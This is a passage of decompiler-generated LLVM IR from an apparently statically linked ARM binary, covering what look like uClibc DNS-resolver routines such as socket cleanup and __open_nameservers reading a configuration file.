  %v7_18b6c = inttoptr i32 %v6_18b6c to i32*
  %v8_18b6c = load i32, i32* %v7_18b6c, align 4
  store i32 %v8_18b6c, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v2_18b1c, i32* @r1, align 4
  store i32 %v0_18b68, i32* @r0, align 4
  %v0_18b88 = call i32 @memcpy()
  %v0_18b8c = load i32, i32* @r8, align 4
  %v1_18b8c = add i32 %v0_18b8c, 4
  %v2_18b8c = inttoptr i32 %v1_18b8c to i32*
  %v3_18b8c = load i32, i32* %v2_18b8c, align 4
  %v7_18b90 = icmp eq i32 %v3_18b8c, 24
  br i1 %v7_18b90, label %dec_label_pc_18bb4, label %dec_label_pc_18b98

dec_label_pc_18b98:                               ; preds = %dec_label_pc_18b68
  %v1_18b98 = add i32 %v0_18b8c, 28
  %v2_18b98 = inttoptr i32 %v1_18b98 to i32*
  %v3_18b98 = load i32, i32* %v2_18b98, align 4
  %v2_18b9c = icmp eq i32 %v3_18b98, 0
  br i1 %v2_18b9c, label %dec_label_pc_18c78, label %dec_label_pc_18ba4

dec_label_pc_18ba4:                               ; preds = %dec_label_pc_18b98
  br i1 %v7_18ba8, label %dec_label_pc_18bb4, label %bb202

bb202:                                            ; preds = %dec_label_pc_18ba4
  br i1 %v8_18bac, label %dec_label_pc_18bb4, label %dec_label_pc_18c78

dec_label_pc_18bb4:                               ; preds = %dec_label_pc_18ba4, %bb202, %dec_label_pc_18b68
  %v9_18bb8 = icmp eq i32 %v3_18b8c, %arg2
  br i1 %v9_18bb8, label %dec_label_pc_18bcc, label %dec_label_pc_18bc0

dec_label_pc_18bc0:                               ; preds = %dec_label_pc_18bb4
  %v1_18bc0 = inttoptr i32 %v0_18b8c to i32*
  %v2_18bc0 = load i32, i32* %v1_18bc0, align 4
  store i32 %v2_18bc0, i32* @r0, align 4
  %v0_18bc4 = call i32 @free()
  br label %dec_label_pc_18c50

dec_label_pc_18bcc:                               ; preds = %dec_label_pc_18bb4
  %v1_18bd4 = add i32 %v0_18b8c, 16
  %v2_18bd4 = inttoptr i32 %v1_18bd4 to i32*
  %v3_18bd4 = load i32, i32* %v2_18bd4, align 4
  %v2_18bd8 = sub i32 %tmp154, %stack_var_-192.0
  %v1_18bdc = add i32 %v2_18bd8, -1
  %v1_18be0 = add i32 %v3_18bd4, 4
  %v2_18be4 = mul i32 %v1_18be0, %v1_18bdc
  %v1_18be8 = add i32 %v0_18b8c, 32
  %v2_18be8 = inttoptr i32 %v1_18be8 to i32*
  %v3_18be8 = load i32, i32* %v2_18be8, align 4
  %v2_18bf0 = add i32 %v0_18b8c, 36
  %v3_18bf0 = inttoptr i32 %v2_18bf0 to i32*
  store i32 %v1_18bdc, i32* %v3_18bf0, align 4
  %tmp293 = icmp ugt i32 %v2_18be4, %v3_18be8
  br i1 %tmp293, label %dec_label_pc_18c78, label %dec_label_pc_18bcc.dec_label_pc_18c4c_crit_edge

dec_label_pc_18bcc.dec_label_pc_18c4c_crit_edge:  ; preds = %dec_label_pc_18bcc
  %v1_18c4c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_18c4c

dec_label_pc_18c04:                               ; preds = %dec_label_pc_18b5c
  %v3_18c04 = load i32, i32* %stack_var_-140, align 4
  store i32 %v3_18c04, i32* @r0, align 4
  %v0_18c08 = call i32 @free()
  br i1 %v9_18c14, label %dec_label_pc_18c1c, label %dec_label_pc_18c50

dec_label_pc_18c1c:                               ; preds = %dec_label_pc_18c04
  %v0_18c1c = load i32, i32* @r8, align 4
  %v1_18c1c = add i32 %v0_18c1c, 16
  %v2_18c1c = inttoptr i32 %v1_18c1c to i32*
  %v3_18c1c = load i32, i32* %v2_18c1c, align 4
  %v9_18c24 = icmp eq i32 %v3_18c1c, %tmp145
  br i1 %v9_18c24, label %dec_label_pc_18c2c, label %dec_label_pc_18d24

dec_label_pc_18c2c:                               ; preds = %dec_label_pc_18c1c
  %v1_18c2c = add i32 %v0_18c1c, 36
  %v2_18c2c = inttoptr i32 %v1_18c2c to i32*
  %v3_18c2c = load i32, i32* %v2_18c2c, align 4
  %v1_18c30 = add i32 %v0_18c1c, 28
  %v2_18c30 = inttoptr i32 %v1_18c30 to i32*
  %v3_18c30 = load i32, i32* %v2_18c30, align 4
  %v3_18c34 = mul i32 %v3_18c2c, %tmp145
  %v4_18c34 = add i32 %v3_18c30, %v3_18c34
  store i32 %v4_18c34, i32* @r0, align 4
  store i32 %tmp145, i32* @r2, align 4
  %v0_18c40 = call i32 @memcpy()
  %v0_18c44 = load i32, i32* @r8, align 4
  %v1_18c44 = add i32 %v0_18c44, 36
  %v2_18c44 = inttoptr i32 %v1_18c44 to i32*
  %v3_18c44 = load i32, i32* %v2_18c44, align 4
  %v1_18c48 = add i32 %v3_18c44, 1
  br label %dec_label_pc_18c4c

dec_label_pc_18c4c:                               ; preds = %dec_label_pc_18bcc.dec_label_pc_18c4c_crit_edge, %dec_label_pc_18c2c
  %v1_18c4c = phi i32 [ %v0_18c44, %dec_label_pc_18c2c ], [ %v1_18c4c.pre, %dec_label_pc_18bcc.dec_label_pc_18c4c_crit_edge ]
  %storemerge4 = phi i32 [ %v1_18c48, %dec_label_pc_18c2c ], [ 0, %dec_label_pc_18bcc.dec_label_pc_18c4c_crit_edge ]
  %v2_18c4c = add i32 %v1_18c4c, 36
  %v3_18c4c = inttoptr i32 %v2_18c4c to i32*
  store i32 %storemerge4, i32* %v3_18c4c, align 4
  br label %dec_label_pc_18c50

dec_label_pc_18c50:                               ; preds = %dec_label_pc_18c04, %dec_label_pc_18bc0, %dec_label_pc_18c4c
  %stack_var_-212.1 = phi i32 [ 0, %dec_label_pc_18c4c ], [ 0, %dec_label_pc_18c04 ], [ %stack_var_-212.2, %dec_label_pc_18bc0 ]
  %v1_18c58 = add i32 %stack_var_-192.0, 1
  %v0_18c60 = load i32, i32* @r5, align 4
  %v2_18c60 = add i32 %v0_18c60, %v5_18b30
  store i32 %v2_18c60, i32* @r5, align 4
  br label %dec_label_pc_18c64

dec_label_pc_18c64:                               ; preds = %dec_label_pc_18b08, %dec_label_pc_18c50
  %v0_18b24 = phi i32 [ %v0_18af8, %dec_label_pc_18b08 ], [ %v2_18c60, %dec_label_pc_18c50 ]
  %stack_var_-212.2 = phi i32 [ 1, %dec_label_pc_18b08 ], [ %stack_var_-212.1, %dec_label_pc_18c50 ]
  %stack_var_-192.0 = phi i32 [ 0, %dec_label_pc_18b08 ], [ %v1_18c58, %dec_label_pc_18c50 ]
  %v2_18c6c = sub i32 %stack_var_-192.0, %tmp154
  %v4_18c6c = xor i32 %stack_var_-192.0, %tmp154
  %v5_18c6c = xor i32 %v2_18c6c, %stack_var_-192.0
  %v6_18c6c = and i32 %v5_18c6c, %v4_18c6c
  %v5_18c70 = icmp slt i32 %stack_var_-192.0, %tmp154
  br i1 %v5_18c70, label %bb203, label %bb204

bb203:                                            ; preds = %dec_label_pc_18c64
  %v7_18c70 = load i32, i32* @fp, align 4
  %v8_18c70 = sub i32 %v0_18b24, %v7_18c70
  %v10_18c70 = xor i32 %v7_18c70, %v0_18b24
  %v11_18c70 = xor i32 %v8_18c70, %v0_18b24
  %v12_18c70 = and i32 %v11_18c70, %v10_18c70
  br label %bb204

bb204:                                            ; preds = %dec_label_pc_18c64, %bb203
  %v1_18c74.in = phi i32 [ %v6_18c6c, %dec_label_pc_18c64 ], [ %v12_18c70, %bb203 ]
  %v0_18c74.in = phi i32 [ %v2_18c6c, %dec_label_pc_18c64 ], [ %v8_18c70, %bb203 ]
  %v0_18c74 = icmp slt i32 %v0_18c74.in, 0
  %v1_18c74 = icmp slt i32 %v1_18c74.in, 0
  %v2_18c74 = xor i1 %v1_18c74, %v0_18c74
  br i1 %v2_18c74, label %dec_label_pc_18b1c, label %dec_label_pc_18c78

dec_label_pc_18c78:                               ; preds = %dec_label_pc_18b4c, %bb202, %dec_label_pc_18bcc, %dec_label_pc_18b98, %bb204
  %v1_18c7c = call i32 @__libc_close(i32 %v0_1895c)
  %v3_18c80 = load i32, i32* %stack_var_0, align 4
  %v2_18c84 = icmp eq i32 %v3_18c80, 0
  br i1 %v2_18c84, label %.thread25, label %bb205

bb205:                                            ; preds = %dec_label_pc_18c78
  %v1_18c8c = load i32, i32* @r7, align 4
  %v3_18c88 = inttoptr i32 %v3_18c80 to i32*
  store i32 %v1_18c8c, i32* %v3_18c88, align 4
  br label %bb206

.thread25:                                        ; preds = %dec_label_pc_18c78
  br label %bb206

bb206:                                            ; preds = %bb205, %.thread25
  store i32 101524, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_18c84, i32 ptrtoint (i32* @global_var_15a00.833 to i32))
  %v2_18c94 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_18c94, i32* @r0, align 4
  store i32 %v2_18728, i32* @r4, align 4
  %v0_18c9c = call i32 @free()
  store i32 %v2_18728, i32* @r0, align 4
  %v1_18cb4 = call i32 @__pthread_return_void()
  %v1_18cc4 = call i32 @__pthread_return_0()
  %v0_18cd0 = load i32, i32* @r6, align 4
  %v3_18cd0 = sdiv i32 %v0_18cd0, 256
  %v0_18cd4 = load i32, i32* @sl, align 4
  store i32 %v0_18cd4, i32* @global_var_2c840.1111, align 4
  store i32 %v2_18728, i32* @r0, align 4
  %v1_18ce0 = trunc i32 %v3_18cd0 to i8
  store i8 %v1_18ce0, i8* @global_var_26591.1114, align 1
  %v1_18ce4 = trunc i32 %v0_18cd0 to i8
  store i8 %v1_18ce4, i8* bitcast (i8** @global_var_26590.1113 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_18cf4.1125 to i32), i32* @lr, align 4
  %v1_18cf0 = call i32 @__pthread_return_void()
  %v0_18e7c.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_18e7c

dec_label_pc_18cf8:                               ; preds = %dec_label_pc_1898c, %dec_label_pc_189ac
  %v0_18cf8 = load i32, i32* @sl, align 4
  %v1_18cf8 = add i32 %v0_18cf8, 1
  %v2_18d00 = srem i32 %v1_18cf8, %arg3
  store i32 %v2_18d00, i32* @sl, align 4
  %v2_18d04 = icmp eq i32 %v2_18d00, 0
  br i1 %v2_18d04, label %dec_label_pc_18d0c, label %dec_label_pc_18dc4.backedge

dec_label_pc_18d0c:                               ; preds = %dec_label_pc_18cf8
  %v1_18d14 = add i32 %stack_var_-208.566, 1
  br label %dec_label_pc_18dc8.outer.backedge

dec_label_pc_18dc8.outer.backedge:                ; preds = %dec_label_pc_18d0c, %dec_label_pc_18da8, %.thread18
  %stack_var_-204.1.ph.be = phi i32 [ %v7_18aa0, %.thread18 ], [ -1, %dec_label_pc_18da8 ], [ -1, %dec_label_pc_18d0c ]
  %stack_var_-208.5.ph.be = phi i32 [ %stack_var_-208.566, %.thread18 ], [ %v1_18db0, %dec_label_pc_18da8 ], [ %v1_18d14, %dec_label_pc_18d0c ]
  %tmp294 = icmp ult i32 %stack_var_-208.5.ph.be, 3
  br i1 %tmp294, label %dec_label_pc_187ac.lr.ph, label %dec_label_pc_18de4

dec_label_pc_18d24:                               ; preds = %dec_label_pc_18c1c
  %v1_18d24 = inttoptr i32 %v0_18c1c to i32*
  %v2_18d24 = load i32, i32* %v1_18d24, align 4
  store i32 %v2_18d24, i32* @r0, align 4
  %v0_18d28 = call i32 @free()
  br label %dec_label_pc_18d2c

dec_label_pc_18d2c:                               ; preds = %dec_label_pc_18abc, %dec_label_pc_18a10, %dec_label_pc_18b4c, %dec_label_pc_18b40, %dec_label_pc_18a28, %dec_label_pc_189f0, %dec_label_pc_18d24
  br i1 %v2_18d30, label %dec_label_pc_18d38, label %dec_label_pc_18d94

dec_label_pc_18d38:                               ; preds = %dec_label_pc_18d2c
  store i32 %v2_18728, i32* @r5, align 4
  store i32 %v2_18728, i32* @r0, align 4
  %v1_18d50 = call i32 @__pthread_return_void()
  %v1_18d60 = call i32 @__pthread_return_0()
  %v2_18d6c = load i32, i32* @global_var_2c910.1119, align 4
  store i32 %v2_18728, i32* @r0, align 4
  %v1_18d7c = call i32 @__pthread_return_void()
  %v1_18d84 = add i32 %v2_18d6c, -1
  store i32 %v1_18d84, i32* @r4, align 4
  %v5_18d8c = icmp slt i32 %v6_18d8c, %v1_18d84
  br i1 %v5_18d8c, label %.thread26, label %dec_label_pc_18d94

.thread26:                                        ; preds = %dec_label_pc_18d38
  %v7_18d8c = add i32 %v6_18d8c, 1
  br label %dec_label_pc_18dc4.backedge

dec_label_pc_18d94:                               ; preds = %dec_label_pc_18d38, %dec_label_pc_18d2c
  %v0_18d94 = load i32, i32* @sl, align 4
  %v1_18d94 = add i32 %v0_18d94, 1
  %v2_18d9c = srem i32 %v1_18d94, %arg3
  store i32 %v2_18d9c, i32* @sl, align 4
  %v2_18da0 = icmp eq i32 %v2_18d9c, 0
  br i1 %v2_18da0, label %dec_label_pc_18da8, label %dec_label_pc_18dc4.backedge

dec_label_pc_18da8:                               ; preds = %dec_label_pc_18d94
  %v1_18db0 = add i32 %stack_var_-208.566, 1
  br label %dec_label_pc_18dc8.outer.backedge

dec_label_pc_18dc4.backedge:                      ; preds = %dec_label_pc_18cf8, %dec_label_pc_18d94, %.thread26
  %storemerge86 = phi i32 [ %v7_18d8c, %.thread26 ], [ -1, %dec_label_pc_18d94 ], [ -1, %dec_label_pc_18cf8 ]
  %tmp295 = icmp ult i32 %stack_var_-208.566, 3
  br i1 %tmp295, label %dec_label_pc_187ac.lr.ph.preheader, label %dec_label_pc_18de4

dec_label_pc_187ac.lr.ph.preheader:               ; preds = %dec_label_pc_187ac.lr.ph.preheader.lr.ph, %dec_label_pc_18dc4.backedge
  %stack_var_-216.0260 = phi i32 [ -1, %dec_label_pc_187ac.lr.ph.preheader.lr.ph ], [ %v0_1895c, %dec_label_pc_18dc4.backedge ]
  %stack_var_-208.4259 = phi i32 [ %v0_187a4, %dec_label_pc_187ac.lr.ph.preheader.lr.ph ], [ %stack_var_-208.566, %dec_label_pc_18dc4.backedge ]
  %v0_18dc4258 = phi i32 [ -1, %dec_label_pc_187ac.lr.ph.preheader.lr.ph ], [ %storemerge86, %dec_label_pc_18dc4.backedge ]
  br label %dec_label_pc_187ac.lr.ph

dec_label_pc_187ac.lr.ph:                         ; preds = %dec_label_pc_187ac.lr.ph.preheader, %dec_label_pc_18dc8.outer.backedge
  %stack_var_-216.1.ph83 = phi i32 [ %v0_1895c, %dec_label_pc_18dc8.outer.backedge ], [ %stack_var_-216.0260, %dec_label_pc_187ac.lr.ph.preheader ]
  %stack_var_-208.5.ph82 = phi i32 [ %stack_var_-208.5.ph.be, %dec_label_pc_18dc8.outer.backedge ], [ %stack_var_-208.4259, %dec_label_pc_187ac.lr.ph.preheader ]
  %v6_18d8c = phi i32 [ %stack_var_-204.1.ph.be, %dec_label_pc_18dc8.outer.backedge ], [ %v0_18dc4258, %dec_label_pc_187ac.lr.ph.preheader ]
  %v1_18854 = icmp slt i32 %v6_18d8c, 0
  %v4_18890 = mul i32 %v6_18d8c, 4
  %v5_18890 = add i32 %v4_18890, ptrtoint (i32* @global_var_2c8f0.1123 to i32)
  %v6_18890 = inttoptr i32 %v5_18890 to i32*
  br label %dec_label_pc_187ac

dec_label_pc_18dd8:                               ; preds = %bb194, %.thread7, %dec_label_pc_18704, %dec_label_pc_186f8
  store i32 -1, i32* @sl, align 4
  store i32 -1, i32* @sb, align 4
  br label %dec_label_pc_18de4

dec_label_pc_18de4:                               ; preds = %dec_label_pc_18714, %dec_label_pc_18dc4.backedge, %dec_label_pc_18dc8.outer.backedge, %bb199, %dec_label_pc_1889c, %dec_label_pc_18dc8.backedge, %dec_label_pc_18dd8
  %stack_var_-216.2 = phi i32 [ -1, %dec_label_pc_18dd8 ], [ %v0_1895c, %dec_label_pc_18dc8.backedge ], [ %v1_187b4, %dec_label_pc_1889c ], [ %v1_187b4, %bb199 ], [ %v0_1895c, %dec_label_pc_18dc8.outer.backedge ], [ -1, %dec_label_pc_18714 ], [ %v0_1895c, %dec_label_pc_18dc4.backedge ]
  %v0_18de4 = call i32 @__GI___h_errno_location()
  %v2_18dec = inttoptr i32 %v0_18de4 to i32*
  store i32 -1, i32* %v2_18dec, align 4
  %v0_18df0 = load i32, i32* @sb, align 4
  store i32 %v0_18df0, i32* @r6, align 4
  br label %dec_label_pc_18df4

dec_label_pc_18df4:                               ; preds = %dec_label_pc_18ae0, %dec_label_pc_18de4
  %v1_18dfc = phi i32 [ %stack_var_-216.2, %dec_label_pc_18de4 ], [ %v0_1895c, %dec_label_pc_18ae0 ]
  %v7_18df8 = icmp eq i32 %v1_18dfc, -1
  br i1 %v7_18df8, label %bb208, label %bb207

bb207:                                            ; preds = %dec_label_pc_18df4
  br label %bb208

bb208:                                            ; preds = %dec_label_pc_18df4, %bb207
  store i32 101892, i32* @lr, align 4
  %v1_18e00 = xor i1 %v7_18df8, true
  call void @__pseudo_cond_branch(i1 %v1_18e00, i32 ptrtoint (i32* @global_var_12908.1116 to i32))
  %v2_18e04 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_18e04, i32* @r0, align 4
  %v0_18e08 = call i32 @free()
  %v0_18e0c = load i32, i32* @r7, align 4
  store i32 %v0_18e0c, i32* @r0, align 4
  %v0_18e10 = call i32 @free()
  %v0_18e14 = load i32, i32* @sl, align 4
  %v7_18e14 = icmp eq i32 %v0_18e14, -1
  br i1 %v7_18e14, label %bb209, label %dec_label_pc_18e20

bb209:                                            ; preds = %bb208
  br label %dec_label_pc_18e7c

dec_label_pc_18e20:                               ; preds = %bb208
  %v2_18e20 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_18e20, i32* @r0, align 4
  %v1_18e38 = call i32 @__pthread_return_void()
  %v1_18e48 = call i32 @__pthread_return_0()
  %v0_18e54 = load i32, i32* @r6, align 4
  %v3_18e54 = sdiv i32 %v0_18e54, 256
  %v0_18e58 = load i32, i32* @sl, align 4
  store i32 %v0_18e58, i32* @global_var_2c840.1111, align 4
  store i32 %v2_18e20, i32* @r0, align 4
  %v1_18e64 = trunc i32 %v3_18e54 to i8
  store i8 %v1_18e64, i8* @global_var_26591.1114, align 1
  %v1_18e68 = trunc i32 %v0_18e54 to i8
  store i8 %v1_18e68, i8* bitcast (i8** @global_var_26590.1113 to i8*), align 4
  store i32 102008, i32* @lr, align 4
  %v1_18e74 = call i32 @__pthread_return_void()
  br label %dec_label_pc_18e7c

dec_label_pc_18e7c:                               ; preds = %bb209, %bb206, %dec_label_pc_18e20
  %v0_18e7c = phi i32 [ %v0_18e14, %bb209 ], [ %v0_18e7c.pre, %bb206 ], [ -1, %dec_label_pc_18e20 ]
  store i32 %v3_186b0, i32* @r4, align 4
  store i32 %v6_186b0, i32* @r5, align 4
  store i32 %v9_186b0, i32* @r6, align 4
  store i32 %v12_186b0, i32* @r7, align 4
  store i32 %v15_186b0, i32* @r8, align 4
  store i32 %v18_186b0, i32* @sb, align 4
  store i32 %v21_186b0, i32* @sl, align 4
  ret i32 %v0_18e7c

; uselistorder directives
  uselistorder i32 %v0_18e54, { 1, 0 }
  uselistorder i32 %v0_18e14, { 1, 0 }
  uselistorder i1 %v7_18df8, { 1, 0 }
  uselistorder i32 %v6_18d8c, { 2, 6, 3, 4, 1, 5, 0 }
  uselistorder i32 %stack_var_-208.5.ph.be, { 1, 0 }
  uselistorder i32 %v0_18cd0, { 1, 0 }
  uselistorder i32 %stack_var_-192.0, { 6, 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-212.2, { 1, 0 }
  uselistorder i32 %v0_18b24, { 0, 1, 3, 2 }
  uselistorder i32 %v0_18c1c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_18bdc, { 1, 0 }
  uselistorder i32 %v0_18afc, { 1, 0 }
  uselistorder i32 %v0_18b00, { 1, 0 }
  uselistorder i32 %v6_18a00, { 1, 0 }
  uselistorder i32 %v0_1895c, { 5, 0, 1, 2, 3, 4, 6, 8, 7, 10, 9, 12, 13, 11 }
  uselistorder i32 %v1_188c8, { 1, 0 }
  uselistorder i32 %v2_18868, { 1, 0 }
  uselistorder i32 %v1_187e0, { 1, 2, 0 }
  uselistorder i1 %v7_187b0, { 1, 0 }
  uselistorder i32 %stack_var_-208.566, { 2, 1, 4, 5, 3, 0 }
  uselistorder i32 %v1_187b4, { 1, 2, 0 }
  uselistorder i32 %v0_187a4, { 1, 0 }
  uselistorder i32 %v2_18728, { 6, 7, 8, 0, 1, 2, 3, 4, 5, 9, 10, 11, 12, 13 }
  uselistorder i32* %stack_var_-236, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i8* %stack_var_-188, { 4, 3, 1, 0, 2 }
  uselistorder i8* %stack_var_-100, { 3, 0, 2, 1 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-140, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32 %tmp154, { 2, 0, 4, 1, 3 }
  uselistorder i32 %tmp145, { 1, 0, 2 }
  uselistorder i32 %tmp, { 2, 1, 0 }
  uselistorder i32 (i32)* @__libc_close, { 15, 16, 20, 19, 18, 13, 17, 14, 12, 11, 1, 0, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 (i32, i32*, i32, i32)* @__libc_send, { 6, 5, 0, 1, 2, 3, 4, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 101, { 5, 1, 2, 3, 0, 4, 6 }
  uselistorder i32 (i32, %sockaddr*, i32)* @__libc_connect, { 2, 0, 1, 4, 3, 5 }
  uselistorder i32 ()* @socket, { 2, 9, 8, 7, 6, 5, 4, 3, 0, 1 }
  uselistorder i32 (i32)* @inet_addr, { 2, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 2, 1, 0, 3 }
  uselistorder i8* @global_var_26591.1114, { 2, 1, 0 }
  uselistorder i32 512, { 3, 14, 2, 15, 1, 10, 11, 12, 13, 0, 6, 7, 5, 8, 4, 9, 16 }
  uselistorder i32 %arg2, { 2, 4, 5, 0, 1, 3 }
  uselistorder label %dec_label_pc_18e7c, { 2, 0, 1 }
  uselistorder label %bb208, { 1, 0 }
  uselistorder label %dec_label_pc_18df4, { 1, 0 }
  uselistorder label %dec_label_pc_18de4, { 6, 1, 2, 5, 4, 3, 0 }
  uselistorder label %dec_label_pc_18dd8, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_187ac.lr.ph.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_18dc4.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_18d2c, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_18dc8.outer.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18cf8, { 1, 0 }
  uselistorder label %bb206, { 1, 0 }
  uselistorder label %dec_label_pc_18c78, { 4, 2, 1, 3, 0 }
  uselistorder label %bb204, { 1, 0 }
  uselistorder label %dec_label_pc_18c64, { 1, 0 }
  uselistorder label %dec_label_pc_18c50, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18c4c, { 1, 0 }
  uselistorder label %dec_label_pc_18bb4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18af0, { 1, 0 }
  uselistorder label %dec_label_pc_18ae0, { 1, 0 }
  uselistorder label %dec_label_pc_18dc8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_18948, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %dec_label_pc_1889c, { 2, 0, 1 }
  uselistorder label %bb199, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_18e88:
  %v0_18e88 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18e88, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_18e88
  %v5_18e88 = mul i32 %arg2, 256
  %v6_18e88 = and i32 %v5_18e88, %arg1
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_18e88, %bb
  %v10_18eb8 = phi i32 [ %arg1, %dec_label_pc_18e88 ], [ %v6_18e88, %bb ]
  ret i32 %v10_18eb8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__open_nameservers(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_18ebc = load i32, i32* @r4, align 4
  store i32 %v3_18ebc, i32* %stack_var_-28, align 4
  %v6_18ebc = load i32, i32* @r5, align 4
  %v9_18ebc = load i32, i32* @r6, align 4
  %v12_18ebc = load i32, i32* @r7, align 4
  %v15_18ebc = load i32, i32* @r8, align 4
  %v18_18ebc = load i32, i32* @sl, align 4
  %v2_18ec0 = ptrtoint i32* %stack_var_-192 to i32
  %v2_18ec4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_18ec4, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_26594.950 to i32), i32* %r2.global-to-local, align 4
  %v1_18ed8 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_26594.950 to i32), i32* %r0.global-to-local, align 4
  store i32 102124, i32* @lr, align 4
  %v1_18ee8 = call i32 @__pthread_return_0()
  store i32 %v1_18ee8, i32* %r0.global-to-local, align 4
  %v2_18ef0 = load i32, i32* @global_var_2c90c.955, align 4
  %v5_18ef8 = icmp sgt i32 %v2_18ef0, 0
  br i1 %v5_18ef8, label %dec_label_pc_19134, label %dec_label_pc_18efc

dec_label_pc_18efc:                               ; preds = %entry
  store i32 ptrtoint ([17 x i8]* @global_var_1dc10.1132 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1dc24.1134 to i32), i32* @r1, align 4
  %v3_18f04 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_1dc10.1132 to i32), i32 ptrtoint (i32* @global_var_1dc24.1134 to i32))
  store i32 %v3_18f04, i32* %r0.global-to-local, align 4
  store i32 %v3_18f04, i32* @sl, align 4
  %v2_18f08 = icmp eq i32 %v3_18f04, 0
  br i1 %v2_18f08, label %dec_label_pc_18f10, label %dec_label_pc_190fc.preheader

dec_label_pc_18f10:                               ; preds = %dec_label_pc_18efc
  store i32 ptrtoint ([24 x i8]* @global_var_1dc28.1136 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1dc24.1134 to i32), i32* @r1, align 4
  %v3_18f18 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_1dc28.1136 to i32), i32 ptrtoint (i32* @global_var_1dc24.1134 to i32))
  store i32 %v3_18f18, i32* %r0.global-to-local, align 4
  store i32 %v3_18f18, i32* @sl, align 4
  %v2_18f1c = icmp eq i32 %v3_18f18, 0
  br i1 %v2_18f1c, label %dec_label_pc_19128, label %dec_label_pc_190fc.preheader

dec_label_pc_190fc.preheader:                     ; preds = %dec_label_pc_18efc, %dec_label_pc_18f10
  %v0_1910426 = phi i32 [ %v3_18f04, %dec_label_pc_18efc ], [ %v3_18f18, %dec_label_pc_18f10 ]
  %v2_18f70 = ptrtoint i32* %stack_var_-28 to i32
  %v3_1900c = inttoptr i32 %tmp to i8*
  store i32 %v2_18ec0, i32* %r0.global-to-local, align 4
  store i32 %v0_1910426, i32* %r2.global-to-local, align 4
  %v3_1910866 = call i32 @fgets(i32 %v2_18ec0, i32 128, i32 %v0_1910426)
  store i32 %v3_1910866, i32* %r0.global-to-local, align 4
  %v2_1910c68 = icmp eq i32 %v3_1910866, 0
  store i32 %v2_18ec0, i32* @r4, align 4
  br i1 %v2_1910c68, label %dec_label_pc_1911c, label %dec_label_pc_18f2c.preheader.lr.ph

dec_label_pc_18f2c.preheader.lr.ph:               ; preds = %dec_label_pc_190fc.preheader
  %v1_18f2c11 = bitcast i32* %stack_var_-192 to i8*
  br label %dec_label_pc_18f2c.preheader

dec_label_pc_18f28:                               ; preds = %dec_label_pc_18f38
  %v1_18f28 = add i32 %v0_18f28, 1
  store i32 %v1_18f28, i32* %r0.global-to-local, align 4
  %v1_18f2c = inttoptr i32 %v1_18f28 to i8*
  %v2_18f2c = load i8, i8* %v1_18f2c, align 1
  %v3_18f2c = zext i8 %v2_18f2c to i32
  store i32 %v3_18f2c, i32* %r2.global-to-local, align 4
  %v2_18f30 = icmp eq i8 %v2_18f2c, 0
  br i1 %v2_18f30, label %dec_label_pc_18f4c, label %dec_label_pc_18f38

dec_label_pc_18f38:                               ; preds = %dec_label_pc_18f38.lr.ph, %dec_label_pc_18f28
  %v0_18f28 = phi i32 [ %v2_18ec0, %dec_label_pc_18f38.lr.ph ], [ %v1_18f28, %dec_label_pc_18f28 ]
  %v1_18f40 = phi i32 [ %v3_18f2c13, %dec_label_pc_18f38.lr.ph ], [ %v3_18f2c, %dec_label_pc_18f28 ]
  %v3_18f40 = mul nuw nsw i32 %v1_18f40, 2
  %v4_18f40 = add i32 %v3_18f40, %v2_18f3c.pre
  %v5_18f40 = inttoptr i32 %v4_18f40 to i8*
  %v6_18f40 = load i8, i8* %v5_18f40, align 1
  %v1_18f44 = and i8 %v6_18f40, 32
  %v2_18f44 = icmp eq i8 %v1_18f44, 0
  br i1 %v2_18f44, label %dec_label_pc_18f4c, label %dec_label_pc_18f28

dec_label_pc_18f4c:                               ; preds = %dec_label_pc_18f28, %dec_label_pc_18f38, %dec_label_pc_18f2c.preheader
